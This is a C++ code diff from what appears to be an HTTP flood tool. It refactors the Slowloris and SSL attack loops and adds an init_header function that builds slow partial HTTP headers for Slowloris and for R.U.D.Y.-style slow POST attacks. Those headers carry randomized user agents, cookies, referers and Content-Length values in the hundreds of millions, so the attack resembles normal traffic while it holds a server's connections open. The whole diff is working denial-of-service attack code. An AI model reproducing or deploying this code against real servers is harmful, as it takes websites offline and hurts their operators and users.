@@ -19,8 +19,9 @@ void Slowloris::attack(const int *id) {
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 keep_alive[x] = false;
             }
-            const std::string &packet = Randomizer::randomPacket(conf, keep_alive[x]);
-            if((r = write_socket(sockets[x], packet.c_str(), static_cast<int>(packet.length()))) == -1){
+            std::string header{};
+            init_header(header, keep_alive[x]);
+            if((r = write_socket(sockets[x], header.c_str(), static_cast<int>(header.length()))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 keep_alive[x] = false;
@@ -31,13 +32,13 @@ void Slowloris::attack(const int *id) {
                 }
                 message = std::string("Socket[") + std::to_string(x) + "->"
                           + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
                 message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
             }
         }
         message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
+        conf->logger->Log(&message, Logger::Info);
         pause();
     }
 }
@@ -63,8 +64,9 @@ void Slowloris::attack_ssl(const int *id) {
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
                 keep_alive[x] = false;
             }
-            const std::string &packet = Randomizer::randomPacket(conf, keep_alive[x]);
-            if((r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()))) == -1){
+            std::string header{};
+            init_header(header, keep_alive[x]);
+            if((r = write_socket(SSLs[x], header.c_str(), static_cast<int>(header.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
@@ -77,18 +79,73 @@ void Slowloris::attack_ssl(const int *id) {
                 }
                 message = std::string("Socket[") + std::to_string(x) + "->"
                           + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
                 message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
             }
         }
         message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
+        conf->logger->Log(&message, Logger::Info);
         pause();
     }
 }
 
-Slowloris::Slowloris(const Config *conf, Logger *logger) : Http_Flood(conf, logger) {
+Slowloris::Slowloris(std::shared_ptr<Config> conf) : Http_Flood(std::move(conf)) {
 
+}
+
+void Slowloris::init_header(std::string& header, bool keep_alive) {
+    switch (conf->vector){
+        case Config::Slowloris:{
+            if(keep_alive){
+                header += "X-a: "
+                          + std::to_string(Randomizer::randomInt(1, 5000))
+                          + " \r\n";
+            }else{
+                header += Randomizer::random_method() + " /";
+                if(conf->RandomizeHeader){
+                    header += Randomizer::randomstr();
+                }
+                header += " HTTP/1.0\r\nUser-Agent: "
+                          + Randomizer::random_useragent(*(conf->useragents))
+                          + " \r\nCache-Control: " + Randomizer::random_caching()
+                          + " \r\nAccept-Encoding: " + Randomizer::random_encoding()
+                          + " \r\nAccept-Charset: " + Randomizer::random_charset() + ", " + Randomizer::random_charset()
+                          + " \r\nReferer: " + Randomizer::random_referer()
+                          + " \r\nContent-Type: " + Randomizer::random_contenttype()
+                          + " \r\nCookie: " + Randomizer::randomstr() + "=" + Randomizer::randomstr()
+                          + " \r\nAccept: */*"
+                          + " \r\nDNT: " + std::to_string(Randomizer::randomInt(0, 1))
+                          + " \r\nX-a: " + std::to_string(Randomizer::randomInt(1, 5000))
+                          + " \r\n";
+            }
+            break;
+        }
+        case Config::Rudy:{
+            if(keep_alive){
+                header += Randomizer::randomstr();
+            }else{
+                header += "POST /";
+                if(conf->RandomizeHeader){
+                    header += Randomizer::randomstr();
+                }
+                header += " HTTP/1.0\r\nUser-Agent: "
+                          + Randomizer::random_useragent(*(conf->useragents))
+                          + " \r\nCache-Control: " + Randomizer::random_caching()
+                          + " \r\nAccept-Encoding: " + Randomizer::random_encoding()
+                          + " \r\nAccept-Charset: " + Randomizer::random_charset() + ", " + Randomizer::random_charset()
+                          + " \r\nReferer: " + Randomizer::random_referer()
+                          + " \r\nContent-Type: " + Randomizer::random_contenttype()
+                          + " \r\nContent-Length: " + std::to_string(Randomizer::randomInt(100000000, 1000000000))
+                          + " \r\nCookie: " + Randomizer::randomstr() + "=" + Randomizer::randomstr()
+                          + " \r\nAccept: */*"
+                          + " \r\nDNT: " + std::to_string(Randomizer::randomInt(0, 1))
+                          + " \r\nX-a: " + std::to_string(Randomizer::randomInt(1, 5000))
+                          + " \r\n";
+            }
+            break;
+        }
+        default:break;
+    }
 }
 
